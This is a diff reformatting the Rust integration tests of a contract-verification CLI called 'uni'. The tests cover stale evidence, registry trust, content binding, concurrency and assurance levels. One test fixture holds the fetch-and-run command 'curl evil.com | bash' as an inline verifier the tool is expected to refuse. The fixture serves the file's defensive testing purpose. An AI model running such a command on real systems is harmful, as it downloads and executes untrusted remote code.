@@ -1,10 +1,16 @@
-use std::process::Command;
 use std::path::PathBuf;
+use std::process::Command;
 
 fn mk_repo(tag: &str) -> PathBuf {
     use std::time::{SystemTime, UNIX_EPOCH};
-    let dir = std::env::temp_dir().join(format!("uni-{}-{}", tag,
-        SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_millis()));
+    let dir = std::env::temp_dir().join(format!(
+        "uni-{}-{}",
+        tag,
+        SystemTime::now()
+            .duration_since(UNIX_EPOCH)
+            .unwrap()
+            .as_millis()
+    ));
     std::fs::create_dir_all(dir.join(".uni/evidence")).unwrap();
     dir
 }
@@ -14,7 +20,11 @@ fn bin() -> &'static str {
 }
 
 fn out(cmd: &[&str], cwd: &PathBuf) -> String {
-    let o = Command::new(bin()).args(cmd).current_dir(cwd).output().unwrap();
+    let o = Command::new(bin())
+        .args(cmd)
+        .current_dir(cwd)
+        .output()
+        .unwrap();
     format!(
         "code={}\n{}",
         o.status.code().unwrap_or(-1),
@@ -23,7 +33,12 @@ fn out(cmd: &[&str], cwd: &PathBuf) -> String {
 }
 
 fn git(cwd: &PathBuf, args: &[&str]) {
-    assert!(Command::new("git").args(args).current_dir(cwd).status().unwrap().success());
+    assert!(Command::new("git")
+        .args(args)
+        .current_dir(cwd)
+        .status()
+        .unwrap()
+        .success());
 }
 
 /// v0.2b-1: STALE end-to-end — evidence bound to commit A cannot mask commit B.
@@ -31,18 +46,28 @@ fn git(cwd: &PathBuf, args: &[&str]) {
 /// from A is invalidated: re-run produces EVIDENCE_REQUIRED, never silently ACCEPTED.
 #[test]
 fn stale_evidence_does_not_mask_new_commit() {
-    let dir = std::env::temp_dir().join(format!("uni-stale-test-{}",
-        std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_millis()));
+    let dir = std::env::temp_dir().join(format!(
+        "uni-stale-test-{}",
+        std::time::SystemTime::now()
+            .duration_since(std::time::UNIX_EPOCH)
+            .unwrap()
+            .as_millis()
+    ));
     std::fs::create_dir_all(&dir).unwrap();
     std::fs::create_dir_all(dir.join(".uni/evidence")).unwrap();
 
     // minimal trusted registry: pass=true
-    std::fs::write(dir.join(".uni/config.toml"),
+    std::fs::write(
+        dir.join(".uni/config.toml"),
         r#"[verifiers]
 "pass" = "true"
-"#).unwrap();
+"#,
+    )
+    .unwrap();
 
-    std::fs::write(dir.join("c.uni"), "VERSION 0.1
+    std::fs::write(
+        dir.join("c.uni"),
+        "VERSION 0.1
 DOMAIN software
 INTENT stale-demo
 GOAL
@@ -53,12 +78,26 @@ VERIFY x
   USING pass
 ACCEPT WHEN
   required_claims == VERIFIED
-").unwrap();
+",
+    )
+    .unwrap();
 
     std::fs::write(dir.join("file.txt"), "1").unwrap();
     git(&dir, &["init", "-q"]);
     git(&dir, &["add", "."]);
-    git(&dir, &["-c", "user.email=t@t", "-c", "user.name=t", "commit", "-q", "-m", "a"]);
+    git(
+        &dir,
+        &[
+            "-c",
+            "user.email=t@t",
+            "-c",
+            "user.name=t",
+            "commit",
+            "-q",
+            "-m",
+            "a",
+        ],
+    );
 
     // First verify on commit A → Accepted
     let r1 = out(&["verify", "c.uni"], &dir);
@@ -66,31 +105,67 @@ ACCEPT WHEN
 
     // Commit B flips the verifier to failing: the ACCEPTED evidence from commit A
     // must NOT mask the new state — UNI re-verifies and now fails.
-    std::fs::write(dir.join(".uni/config.toml"),
+    std::fs::write(
+        dir.join(".uni/config.toml"),
         r#"[verifiers]
 "pass" = "false"
-"#).unwrap();
+"#,
+    )
+    .unwrap();
     git(&dir, &["add", "."]);
-    git(&dir, &["-c", "user.email=t@t", "-c", "user.name=t", "commit", "-q", "-m", "b"]);
+    git(
+        &dir,
+        &[
+            "-c",
+            "user.email=t@t",
+            "-c",
+            "user.name=t",
+            "commit",
+            "-q",
+            "-m",
+            "b",
+        ],
+    );
 
-    let o = Command::new(bin()).args(["verify", "c.uni"]).current_dir(&dir).output().unwrap();
-    assert_ne!(o.status.code(), Some(0), "stale accepted evidence must not mask commit B");
+    let o = Command::new(bin())
+        .args(["verify", "c.uni"])
+        .current_dir(&dir)
+        .output()
+        .unwrap();
+    assert_ne!(
+        o.status.code(),
+        Some(0),
+        "stale accepted evidence must not mask commit B"
+    );
     let stdout = String::from_utf8_lossy(&o.stdout);
-    assert!(stdout.contains("EvidenceRequired") || stdout.contains("no valid evidence"), "{stdout}");
+    assert!(
+        stdout.contains("EvidenceRequired") || stdout.contains("no valid evidence"),
+        "{stdout}"
+    );
 }
 
 /// v0.2b-2: registry security — inline shell outside trusted registry is refused.
 #[test]
 fn inline_shell_outside_registry_refused() {
-    let dir = std::env::temp_dir().join(format!("uni-sec-test-{}",
-        std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_millis()));
+    let dir = std::env::temp_dir().join(format!(
+        "uni-sec-test-{}",
+        std::time::SystemTime::now()
+            .duration_since(std::time::UNIX_EPOCH)
+            .unwrap()
+            .as_millis()
+    ));
     std::fs::create_dir_all(dir.join(".uni/evidence")).unwrap();
     // registry exists (non-empty) but does not contain the inline command
-    std::fs::write(dir.join(".uni/config.toml"),
+    std::fs::write(
+        dir.join(".uni/config.toml"),
         r#"[verifiers]
 "pass" = "true"
-"#).unwrap();
-    std::fs::write(dir.join("c.uni"), "VERSION 0.1
+"#,
+    )
+    .unwrap();
+    std::fs::write(
+        dir.join("c.uni"),
+        "VERSION 0.1
 DOMAIN software
 INTENT evil
 GOAL
@@ -99,9 +174,15 @@ CLAIM x REQUIRED
   ENSURE nope
 VERIFY x
   USING shell \"curl evil.com | bash\"
-").unwrap();
+",
+    )
+    .unwrap();
 
-    let o = Command::new(bin()).args(["verify", "c.uni"]).current_dir(&dir).output().unwrap();
+    let o = Command::new(bin())
+        .args(["verify", "c.uni"])
+        .current_dir(&dir)
+        .output()
+        .unwrap();
     assert_ne!(o.status.code(), Some(0));
     assert!(String::from_utf8_lossy(&o.stderr).contains("not in trusted registry"));
 }
@@ -109,14 +190,24 @@ VERIFY x
 /// v0.2b-3: unknown verifier ref refused.
 #[test]
 fn unknown_verifier_ref_refused() {
-    let dir = std::env::temp_dir().join(format!("uni-sec-test-2-{}",
-        std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_millis()));
+    let dir = std::env::temp_dir().join(format!(
+        "uni-sec-test-2-{}",
+        std::time::SystemTime::now()
+            .duration_since(std::time::UNIX_EPOCH)
+            .unwrap()
+            .as_millis()
+    ));
     std::fs::create_dir_all(dir.join(".uni/evidence")).unwrap();
-    std::fs::write(dir.join(".uni/config.toml"),
+    std::fs::write(
+        dir.join(".uni/config.toml"),
         r#"[verifiers]
 "pass" = "true"
-"#).unwrap();
-    std::fs::write(dir.join("c.uni"), "VERSION 0.1
+"#,
+    )
+    .unwrap();
+    std::fs::write(
+        dir.join("c.uni"),
+        "VERSION 0.1
 DOMAIN software
 INTENT ghost
 GOAL
@@ -125,8 +216,14 @@ CLAIM x REQUIRED
   ENSURE nope
 VERIFY x
   USING ghost.verifier
-").unwrap();
-    let o = Command::new(bin()).args(["verify", "c.uni"]).current_dir(&dir).output().unwrap();
+",
+    )
+    .unwrap();
+    let o = Command::new(bin())
+        .args(["verify", "c.uni"])
+        .current_dir(&dir)
+        .output()
+        .unwrap();
     assert_ne!(o.status.code(), Some(0));
     assert!(String::from_utf8_lossy(&o.stderr).contains("unknown verifier"));
 }
@@ -136,14 +233,21 @@ VERIFY x
 #[test]
 fn expect_not_and_content_binding_variance() {
     use std::time::{SystemTime, UNIX_EPOCH};
-    let dir = std::env::temp_dir().join(format!("uni-content-test-{}",
-        SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_millis()));
+    let dir = std::env::temp_dir().join(format!(
+        "uni-content-test-{}",
+        SystemTime::now()
+            .duration_since(UNIX_EPOCH)
+            .unwrap()
+            .as_millis()
+    ));
     std::fs::create_dir_all(dir.join(".uni/evidence")).unwrap();
     std::fs::create_dir_all(dir.join("sources")).unwrap();
     std::fs::write(dir.join(".uni/config.toml"),
 "[verifiers.\"no.evil\"]\nrun = \"! grep -Rn 'EVIL' sources\"\nexpect_not = \"EVIL\"\nfiles = [\"sources/**\"]\ntimeout = 60\n").unwrap();
     std::fs::write(dir.join("sources/lib.txt"), "ledger_read_only();\n").unwrap();
-    std::fs::write(dir.join("c.uni"), "VERSION 0.1
+    std::fs::write(
+        dir.join("c.uni"),
+        "VERSION 0.1
 DOMAIN software
 INTENT content-bound
 GOAL
@@ -152,10 +256,24 @@ CLAIM x REQUIRED
   ENSURE no EVIL
 VERIFY x
   USING no.evil
-").unwrap();
+",
+    )
+    .unwrap();
     git(&dir, &["init", "-q"]);
     git(&dir, &["add", "."]);
-    git(&dir, &["-c", "user.email=t@t", "-c", "user.name=t", "commit", "-q", "-m", "a"]);
+    git(
+        &dir,
+        &[
+            "-c",
+            "user.email=t@t",
+            "-c",
+            "user.name=t",
+            "commit",
+            "-q",
+            "-m",
+            "a",
+        ],
+    );
 
     // clean tree → Accepted
     let r1 = out(&["verify", "c.uni"], &dir);
@@ -163,10 +281,21 @@ VERIFY x
 
     // same commit, but watched file content changes → cached evidence stale, re-run fails, blocked
     std::fs::write(dir.join("sources/lib.txt"), "EVIL_WRITE(ledger);\n").unwrap();
-    let o = Command::new(bin()).args(["verify", "c.uni"]).current_dir(&dir).output().unwrap();
-    assert_ne!(o.status.code(), Some(0), "content change must invalidate cached evidence");
+    let o = Command::new(bin())
+        .args(["verify", "c.uni"])
+        .current_dir(&dir)
+        .output()
+        .unwrap();
+    assert_ne!(
+        o.status.code(),
+        Some(0),
+        "content change must invalidate cached evidence"
+    );
     let stdout = String::from_utf8_lossy(&o.stdout);
-    assert!(stdout.contains("no valid evidence") || stdout.contains("FAIL"), "{stdout}");
+    assert!(
+        stdout.contains("no valid evidence") || stdout.contains("FAIL"),
+        "{stdout}"
+    );
 
     // restored content matches the original hash → cached evidence valid again
     std::fs::write(dir.join("sources/lib.txt"), "ledger_read_only();\n").unwrap();
@@ -179,18 +308,45 @@ VERIFY x
 #[test]
 fn evidence_cannot_cross_contract_boundary() {
     let dir = mk_repo("evidence-isolation");
-    std::fs::write(dir.join(".uni/config.toml"),
-        "[verifiers]\n\"ok\" = \"true\"\n\"bad\" = \"false\"\n").unwrap();
+    std::fs::write(
+        dir.join(".uni/config.toml"),
+        "[verifiers]\n\"ok\" = \"true\"\n\"bad\" = \"false\"\n",
+    )
+    .unwrap();
     std::fs::write(dir.join("c1.uni"), "VERSION 0.1\nDOMAIN software\nINTENT c1\nGOAL\n g\nCLAIM x REQUIRED\n  ENSURE g\nVERIFY x\n  USING ok\n").unwrap();
     std::fs::write(dir.join("c2.uni"), "VERSION 0.1\nDOMAIN software\nINTENT c2\nGOAL\n g\nCLAIM x REQUIRED\n  ENSURE g\nVERIFY x\n  USING bad\n").unwrap();
     git(&dir, &["init", "-q"]);
     git(&dir, &["add", "."]);
-    git(&dir, &["-c", "user.email=t@t", "-c", "user.name=t", "commit", "-q", "-m", "base"]);
+    git(
+        &dir,
+        &[
+            "-c",
+            "user.email=t@t",
+            "-c",
+            "user.name=t",
+            "commit",
+            "-q",
+            "-m",
+            "base",
+        ],
+    );
 
-    let o1 = Command::new(bin()).args(["verify", "c1.uni"]).current_dir(&dir).output().unwrap();
+    let o1 = Command::new(bin())
+        .args(["verify", "c1.uni"])
+        .current_dir(&dir)
+        .output()
+        .unwrap();
     assert_eq!(o1.status.code(), Some(0), "c1 should ACCEPT");
-    let o2 = Command::new(bin()).args(["verify", "c2.uni"]).current_dir(&dir).output().unwrap();
-    assert_ne!(o2.status.code(), Some(0), "c2 must NOT reuse c1 evidence for claim x");
+    let o2 = Command::new(bin())
+        .args(["verify", "c2.uni"])
+        .current_dir(&dir)
+        .output()
+        .unwrap();
+    assert_ne!(
+        o2.status.code(),
+        Some(0),
+        "c2 must NOT reuse c1 evidence for claim x"
+    );
 }
 
 /// v0.18 regression: expect_not is matched against the FULL output, not the
@@ -203,9 +359,29 @@ fn expect_not_beyond_excerpt_window_invalidates() {
     std::fs::write(dir.join("c.uni"), "VERSION 0.1\nDOMAIN software\nINTENT c3\nGOAL\n g\nCLAIM y REQUIRED\n  ENSURE clean\nVERIFY y\n  USING catbig\n").unwrap();
     git(&dir, &["init", "-q"]);
     git(&dir, &["add", "."]);
-    git(&dir, &["-c", "user.email=t@t", "-c", "user.name=t", "commit", "-q", "-m", "base"]);
-    let o = Command::new(bin()).args(["verify", "c.uni"]).current_dir(&dir).output().unwrap();
-    assert_ne!(o.status.code(), Some(0), "hidden EVIL_TAIL must invalidate evidence");
+    git(
+        &dir,
+        &[
+            "-c",
+            "user.email=t@t",
+            "-c",
+            "user.name=t",
+            "commit",
+            "-q",
+            "-m",
+            "base",
+        ],
+    );
+    let o = Command::new(bin())
+        .args(["verify", "c.uni"])
+        .current_dir(&dir)
+        .output()
+        .unwrap();
+    assert_ne!(
+        o.status.code(),
+        Some(0),
+        "hidden EVIL_TAIL must invalidate evidence"
+    );
 }
 
 /// v0.19 regression (A3): two concurrent verifies must never corrupt state.
@@ -213,39 +389,86 @@ fn expect_not_beyond_excerpt_window_invalidates() {
 #[test]
 fn concurrent_verify_never_corrupts_state() {
     use std::time::{SystemTime, UNIX_EPOCH};
-    let dir = std::env::temp_dir().join(format!("uni-conc-{}",
-        SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_millis()));
+    let dir = std::env::temp_dir().join(format!(
+        "uni-conc-{}",
+        SystemTime::now()
+            .duration_since(UNIX_EPOCH)
+            .unwrap()
+            .as_millis()
+    ));
     std::fs::create_dir_all(dir.join(".uni/evidence")).unwrap();
-    std::fs::write(dir.join(".uni/config.toml"), "[verifiers]\n\"p\" = \"true\"\n").unwrap();
+    std::fs::write(
+        dir.join(".uni/config.toml"),
+        "[verifiers]\n\"p\" = \"true\"\n",
+    )
+    .unwrap();
     std::fs::write(dir.join("c1.uni"), "VERSION 0.1\nDOMAIN software\nINTENT k1\nGOAL\n g\nCLAIM x REQUIRED\n  ENSURE g\nVERIFY x\n  USING p\nACCEPT WHEN\n  required_claims == VERIFIED\n  AND critical_failures == 0\n").unwrap();
     std::fs::write(dir.join("c2.uni"), "VERSION 0.1\nDOMAIN software\nINTENT k2\nGOAL\n g\nCLAIM y REQUIRED\n  ENSURE g\nVERIFY y\n  USING p\nACCEPT WHEN\n  required_claims == VERIFIED\n  AND critical_failures == 0\n").unwrap();
     git(&dir, &["init", "-q"]);
     git(&dir, &["add", "."]);
-    git(&dir, &["-c", "user.email=t@t", "-c", "user.name=t", "commit", "-q", "-m", "a"]);
+    git(
+        &dir,
+        &[
+            "-c",
+            "user.email=t@t",
+            "-c",
+            "user.name=t",
+            "commit",
+            "-q",
+            "-m",
+            "a",
+        ],
+    );
 
     let exe1 = bin().to_string();
     let exe2 = exe1.clone();
     let d1 = dir.clone();
     let d2 = dir.clone();
     let h1 = std::thread::spawn(move || {
-        Command::new(&exe1).args(["verify", "c1.uni"]).current_dir(&d1).output().unwrap()
+        Command::new(&exe1)
+            .args(["verify", "c1.uni"])
+            .current_dir(&d1)
+            .output()
+            .unwrap()
     });
     let h2 = std::thread::spawn(move || {
-        Command::new(&exe2).args(["verify", "c2.uni"]).current_dir(&d2).output().unwrap()
+        Command::new(&exe2)
+            .args(["verify", "c2.uni"])
+            .current_dir(&d2)
+            .output()
+            .unwrap()
     });
     let o1 = h1.join().unwrap();
     let o2 = h2.join().unwrap();
-    assert_eq!(o1.status.code(), Some(0), "{}", String::from_utf8_lossy(&o1.stderr));
-    assert_eq!(o2.status.code(), Some(0), "{}", String::from_utf8_lossy(&o2.stderr));
-    assert!(!dir.join(".uni/.lock").exists(), "lock must be released after verify");
+    assert_eq!(
+        o1.status.code(),
+        Some(0),
+        "{}",
+        String::from_utf8_lossy(&o1.stderr)
+    );
+    assert_eq!(
+        o2.status.code(),
+        Some(0),
+        "{}",
+        String::from_utf8_lossy(&o2.stderr)
+    );
+    assert!(
+        !dir.join(".uni/.lock").exists(),
+        "lock must be released after verify"
+    );
     let last = std::fs::read_to_string(dir.join(".uni/decisions/last.json")).unwrap();
-    let v: serde_json::Value = serde_json::from_str(&last).expect("last.json must parse after races");
+    let v: serde_json::Value =
+        serde_json::from_str(&last).expect("last.json must parse after races");
     assert!(v["decision"].is_string());
-    for line in std::fs::read_to_string(dir.join(".uni/events.jsonl")).unwrap().lines() {
+    for line in std::fs::read_to_string(dir.join(".uni/events.jsonl"))
+        .unwrap()
+        .lines()
+    {
         if line.trim().is_empty() {
             continue;
         }
-        let e: serde_json::Value = serde_json::from_str(line).expect("journal line must be complete JSON");
+        let e: serde_json::Value =
+            serde_json::from_str(line).expect("journal line must be complete JSON");
         assert!(e["event"].is_string());
     }
 }
@@ -271,7 +494,19 @@ fn policy_change_governs_recomputed_decision() {
     .unwrap();
     git(&dir, &["init", "-q"]);
     git(&dir, &["add", "."]);
-    git(&dir, &["-c", "user.email=t@t", "-c", "user.name=t", "commit", "-q", "-m", "a"]);
+    git(
+        &dir,
+        &[
+            "-c",
+            "user.email=t@t",
+            "-c",
+            "user.name=t",
+            "commit",
+            "-q",
+            "-m",
+            "a",
+        ],
+    );
 
     let r1 = out(&["verify", "c.uni"], &dir);
     assert!(r1.contains("Accepted"), "{r1}");
@@ -283,14 +518,42 @@ fn policy_change_governs_recomputed_decision() {
     )
     .unwrap();
     git(&dir, &["add", "."]);
-    git(&dir, &["-c", "user.email=t@t", "-c", "user.name=t", "commit", "-q", "-m", "strict"]);
+    git(
+        &dir,
+        &[
+            "-c",
+            "user.email=t@t",
+            "-c",
+            "user.name=t",
+            "commit",
+            "-q",
+            "-m",
+            "strict",
+        ],
+    );
     // Break the watched content and commit: previous proof goes stale AND the
     // re-run cannot renew it (expectation miss).
     std::fs::write(dir.join("marker.txt"), "trash\n").unwrap();
     git(&dir, &["add", "."]);
-    git(&dir, &["-c", "user.email=t@t", "-c", "user.name=t", "commit", "-q", "-m", "break-it"]);
+    git(
+        &dir,
+        &[
+            "-c",
+            "user.email=t@t",
+            "-c",
+            "user.name=t",
+            "commit",
+            "-q",
+            "-m",
+            "break-it",
+        ],
+    );
 
-    let o = Command::new(bin()).args(["verify", "c.uni"]).current_dir(&dir).output().unwrap();
+    let o = Command::new(bin())
+        .args(["verify", "c.uni"])
+        .current_dir(&dir)
+        .output()
+        .unwrap();
     let stdout = String::from_utf8_lossy(&o.stdout).to_string();
     assert!(
         stdout.contains("Escalated") && stdout.contains("escalate_on_stale"),
@@ -302,7 +565,11 @@ fn policy_change_governs_recomputed_decision() {
 #[test]
 fn registry_change_flags_trust_boundary_once() {
     let dir = mk_repo("registry-diff");
-    std::fs::write(dir.join(".uni/config.toml"), "[verifiers]\n\"p\" = \"true\"\n").unwrap();
+    std::fs::write(
+        dir.join(".uni/config.toml"),
+        "[verifiers]\n\"p\" = \"true\"\n",
+    )
+    .unwrap();
     std::fs::write(
         dir.join("c.uni"),
         "VERSION 0.1\nDOMAIN software\nINTENT tb\nGOAL\n g\nCLAIM x REQUIRED\n  ENSURE g\nVERIFY x\n  USING p\nACCEPT WHEN\n  required_claims == VERIFIED\n  AND critical_failures == 0\n",
@@ -310,7 +577,19 @@ fn registry_change_flags_trust_boundary_once() {
     .unwrap();
     git(&dir, &["init", "-q"]);
     git(&dir, &["add", "."]);
-    git(&dir, &["-c", "user.email=t@t", "-c", "user.name=t", "commit", "-q", "-m", "a"]);
+    git(
+        &dir,
+        &[
+            "-c",
+            "user.email=t@t",
+            "-c",
+            "user.name=t",
+            "commit",
+            "-q",
+            "-m",
+            "a",
+        ],
+    );
     let r1 = out(&["verify", "c.uni"], &dir);
     assert!(r1.contains("Accepted"), "{r1}");
     assert!(dir.join(".uni/.registry.hash").exists());
@@ -322,16 +601,42 @@ fn registry_change_flags_trust_boundary_once() {
     )
     .unwrap();
     git(&dir, &["add", "."]);
-    git(&dir, &["-c", "user.email=t@t", "-c", "user.name=t", "commit", "-q", "-m", "regchange"]);
+    git(
+        &dir,
+        &[
+            "-c",
+            "user.email=t@t",
+            "-c",
+            "user.name=t",
+            "commit",
+            "-q",
+            "-m",
+            "regchange",
+        ],
+    );
 
-    let o = Command::new(bin()).args(["verify", "c.uni"]).current_dir(&dir).output().unwrap();
+    let o = Command::new(bin())
+        .args(["verify", "c.uni"])
+        .current_dir(&dir)
+        .output()
+        .unwrap();
     let stdout = String::from_utf8_lossy(&o.stdout).to_string();
     assert!(stdout.contains("REGISTRY_CHANGED"), "{stdout}");
-    assert!(stdout.contains("1 added") && stdout.contains("- q"), "{stdout}");
+    assert!(
+        stdout.contains("1 added") && stdout.contains("- q"),
+        "{stdout}"
+    );
 
-    let j = Command::new(bin()).args(["--json", "verify", "c.uni"]).current_dir(&dir).output().unwrap();
+    let j = Command::new(bin())
+        .args(["--json", "verify", "c.uni"])
+        .current_dir(&dir)
+        .output()
+        .unwrap();
     let v: serde_json::Value = serde_json::from_slice(&j.stdout).unwrap();
-    assert_eq!(v["trust_boundary_changed"], false, "baseline acknowledged by the human run");
+    assert_eq!(
+        v["trust_boundary_changed"], false,
+        "baseline acknowledged by the human run"
+    );
 
     // A new drift raises the flag again on the very run that observes it.
     std::fs::write(
@@ -340,8 +645,24 @@ fn registry_change_flags_trust_boundary_once() {
     )
     .unwrap();
     git(&dir, &["add", "."]);
-    git(&dir, &["-c", "user.email=t@t", "-c", "user.name=t", "commit", "-q", "-m", "regchange2"]);
-    let j2 = Command::new(bin()).args(["--json", "verify", "c.uni"]).current_dir(&dir).output().unwrap();
+    git(
+        &dir,
+        &[
+            "-c",
+            "user.email=t@t",
+            "-c",
+            "user.name=t",
+            "commit",
+            "-q",
+            "-m",
+            "regchange2",
+        ],
+    );
+    let j2 = Command::new(bin())
+        .args(["--json", "verify", "c.uni"])
+        .current_dir(&dir)
+        .output()
+        .unwrap();
     let v2: serde_json::Value = serde_json::from_slice(&j2.stdout).unwrap();
     assert_eq!(v2["trust_boundary_changed"], true);
 }
@@ -351,7 +672,11 @@ fn registry_change_flags_trust_boundary_once() {
 #[test]
 fn actor_model_caps_assurance_honestly() {
     let dir = mk_repo("actor-caps");
-    std::fs::write(dir.join(".uni/config.toml"), "[verifiers]\n\"p\" = \"true\"\n").unwrap();
+    std::fs::write(
+        dir.join(".uni/config.toml"),
+        "[verifiers]\n\"p\" = \"true\"\n",
+    )
+    .unwrap();
     std::fs::write(
         dir.join("c.uni"),
         "VERSION 0.1\nDOMAIN software\nINTENT act\nGOAL\n g\nCLAIM x REQUIRED\n  ENSURE g\nVERIFY x\n  USING p\nACCEPT WHEN\n  required_claims == VERIFIED\n  AND critical_failures == 0\n",
@@ -359,12 +684,28 @@ fn actor_model_caps_assurance_honestly() {
     .unwrap();
     git(&dir, &["init", "-q"]);
     git(&dir, &["add", "."]);
-    git(&dir, &["-c", "user.email=t@t", "-c", "user.name=t", "commit", "-q", "-m", "a"]);
+    git(
+        &dir,
+        &[
+            "-c",
+            "user.email=t@t",
+            "-c",
+            "user.name=t",
+            "commit",
+            "-q",
+            "-m",
+            "a",
+        ],
+    );
 
     // Default: local actor, max A2.
     let r1 = out(&["verify", "c.uni"], &dir);
     assert!(r1.contains("Accepted"), "{r1}");
-    let rep = Command::new(bin()).args(["report", "--json"]).current_dir(&dir).output().unwrap();
+    let rep = Command::new(bin())
+        .args(["report", "--json"])
+        .current_dir(&dir)
+        .output()
+        .unwrap();
     let v: serde_json::Value = serde_json::from_slice(&rep.stdout).unwrap();
     assert_eq!(v["assurance"], "A2", "{v}");
     assert_eq!(v["independent_actor"], false);
@@ -375,8 +716,17 @@ fn actor_model_caps_assurance_honestly() {
         .current_dir(&dir)
         .output()
         .unwrap();
-    assert_eq!(o.status.code(), Some(0), "{}", String::from_utf8_lossy(&o.stderr));
-    let rep2 = Command::new(bin()).args(["report", "--json"]).current_dir(&dir).output().unwrap();
+    assert_eq!(
+        o.status.code(),
+        Some(0),
+        "{}",
+        String::from_utf8_lossy(&o.stderr)
+    );
+    let rep2 = Command::new(bin())
+        .args(["report", "--json"])
+        .current_dir(&dir)
+        .output()
+        .unwrap();
     let v2: serde_json::Value = serde_json::from_slice(&rep2.stdout).unwrap();
     assert_eq!(v2["assurance"], "A3-D", "{v2}");
     assert_eq!(v2["independent_actor"], true);
@@ -389,7 +739,11 @@ fn actor_model_caps_assurance_honestly() {
         .output()
         .unwrap();
     assert_eq!(o3.status.code(), Some(0));
-    let rep3 = Command::new(bin()).args(["report", "--json"]).current_dir(&dir).output().unwrap();
+    let rep3 = Command::new(bin())
+        .args(["report", "--json"])
+        .current_dir(&dir)
+        .output()
+        .unwrap();
     let v3: serde_json::Value = serde_json::from_slice(&rep3.stdout).unwrap();
     assert_eq!(v3["assurance"], "A3-D", "{v3}");
     assert_eq!(v3["identity_assurance"], "SELF-DECLARED");
@@ -414,26 +768,59 @@ fn actor_model_caps_assurance_honestly() {
 #[test]
 fn requirement_needs_authorized_binding() {
     let dir = mk_repo("binding-cycle");
-    std::fs::write(dir.join(".uni/config.toml"), "[verifiers]\n\"suite\" = \"true\"\n").unwrap();
+    std::fs::write(
+        dir.join(".uni/config.toml"),
+        "[verifiers]\n\"suite\" = \"true\"\n",
+    )
+    .unwrap();
     let contract = "VERSION 0.1\nDOMAIN software\nINTENT bd\nGOAL\n g\nCLAIM x REQUIRED\n  ENSURE g\nVERIFY x\n  USING suite\n  REQUIRE behavior(\"does x\")\nACCEPT WHEN\n  required_claims == VERIFIED\n  AND critical_failures == 0\n";
     std::fs::write(dir.join("c.uni"), contract).unwrap();
     git(&dir, &["init", "-q"]);
     git(&dir, &["add", "."]);
-    git(&dir, &["-c", "user.email=t@t", "-c", "user.name=t", "commit", "-q", "-m", "a"]);
+    git(
+        &dir,
+        &[
+            "-c",
+            "user.email=t@t",
+            "-c",
+            "user.name=t",
+            "commit",
+            "-q",
+            "-m",
+            "a",
+        ],
+    );
 
     // 1. Unbound requirement: hard error naming the exact command, no execution.
-    let o = Command::new(bin()).args(["verify", "c.uni"]).current_dir(&dir).output().unwrap();
+    let o = Command::new(bin())
+        .args(["verify", "c.uni"])
+        .current_dir(&dir)
+        .output()
+        .unwrap();
     assert_ne!(o.status.code(), Some(0));
     let err = String::from_utf8_lossy(&o.stderr).to_string();
     assert!(err.contains("uni bind --claim x --verifier suite"), "{err}");
 
     // 2. Authorize, then verify accepts.
     let b = Command::new(bin())
-        .args(["bind", "--claim", "x", "--verifier", "suite", "--requirement", "behavior(\"does x\")"])
+        .args([
+            "bind",
+            "--claim",
+            "x",
+            "--verifier",
+            "suite",
+            "--requirement",
+            "behavior(\"does x\")",
+        ])
         .current_dir(&dir)
         .output()
         .unwrap();
-    assert_eq!(b.status.code(), Some(0), "{}", String::from_utf8_lossy(&b.stderr));
+    assert_eq!(
+        b.status.code(),
+        Some(0),
+        "{}",
+        String::from_utf8_lossy(&b.stderr)
+    );
     let r1 = out(&["verify", "c.uni"], &dir);
     assert!(r1.contains("Accepted"), "{r1}");
 
@@ -443,18 +830,44 @@ fn requirement_needs_authorized_binding() {
     let contract2 = "VERSION 0.1\nDOMAIN software\nINTENT bd\nGOAL\n g\nCLAIM x REQUIRED\n  ENSURE g\nVERIFY x\n  USING suite\n  REQUIRE behavior(\"does x, v2\")\nACCEPT WHEN\n  required_claims == VERIFIED\n  AND critical_failures == 0\n";
     std::fs::write(dir.join("c.uni"), contract2).unwrap();
     let b2 = Command::new(bin())
-        .args(["bind", "--claim", "x", "--verifier", "suite", "--requirement", "behavior(\"does x, v2\")"])
+        .args([
+            "bind",
+            "--claim",
+            "x",
+            "--verifier",
+            "suite",
+            "--requirement",
+            "behavior(\"does x, v2\")",
+        ])
         .current_dir(&dir)
         .output()
         .unwrap();
     assert_eq!(b2.status.code(), Some(0));
     git(&dir, &["add", "."]);
-    git(&dir, &["-c", "user.email=t@t", "-c", "user.name=t", "commit", "-q", "-m", "req-v2"]);
+    git(
+        &dir,
+        &[
+            "-c",
+            "user.email=t@t",
+            "-c",
+            "user.name=t",
+            "commit",
+            "-q",
+            "-m",
+            "req-v2",
+        ],
+    );
     let r2 = out(&["verify", "c.uni"], &dir);
     assert!(r2.contains("Accepted"), "{r2}");
     let journal = std::fs::read_to_string(dir.join(".uni/events.jsonl")).unwrap();
-    assert!(journal.contains("BindingAuthorized"), "bind must journalize the human act");
-    assert!(journal.matches("EvidenceRun").count() >= 2, "re-authorization must force renewal");
+    assert!(
+        journal.contains("BindingAuthorized"),
+        "bind must journalize the human act"
+    );
+    assert!(
+        journal.matches("EvidenceRun").count() >= 2,
+        "re-authorization must force renewal"
+    );
 }
 
 /// A verifier that creates untracked build output (a compiler, a bundler)
@@ -463,7 +876,11 @@ fn requirement_needs_authorized_binding() {
 #[test]
 fn build_artifacts_do_not_stale_own_evidence() {
     let dir = mk_repo("self-dirty");
-    std::fs::write(dir.join(".uni/config.toml"), "[verifiers]\n\"build\" = \"mkdir -p target/debug && echo x > target/debug/out && true\"\n").unwrap();
+    std::fs::write(
+        dir.join(".uni/config.toml"),
+        "[verifiers]\n\"build\" = \"mkdir -p target/debug && echo x > target/debug/out && true\"\n",
+    )
+    .unwrap();
     std::fs::write(
         dir.join("c.uni"),
         "VERSION 0.1\nDOMAIN software\nINTENT selfdirty\nGOAL\n g\nCLAIM x REQUIRED\n  ENSURE g\nVERIFY x\n  USING build\nACCEPT WHEN\n  required_claims == VERIFIED\n  AND critical_failures == 0\n",
@@ -471,9 +888,24 @@ fn build_artifacts_do_not_stale_own_evidence() {
     .unwrap();
     git(&dir, &["init", "-q"]);
     git(&dir, &["add", "."]);
-    git(&dir, &["-c", "user.email=t@t", "-c", "user.name=t", "commit", "-q", "-m", "a"]);
+    git(
+        &dir,
+        &[
